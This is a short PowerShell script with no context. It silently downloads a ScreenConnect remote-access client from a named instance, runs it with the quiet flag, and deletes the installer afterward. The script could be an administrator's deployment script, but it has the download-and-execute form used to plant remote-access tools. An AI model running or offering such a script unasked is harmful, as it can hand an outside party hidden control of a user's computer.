$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest 'https://thelighthousecorsica.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=Webby' -OutFile "$env:TEMP\ScreenConnect.ClientSetup.exe"
Start-Process "$env:TEMP\ScreenConnect.ClientSetup.exe" -ArgumentList '/quiet' -Wait
Remove-Item "$env:TEMP\ScreenConnect.ClientSetup.exe" -Force
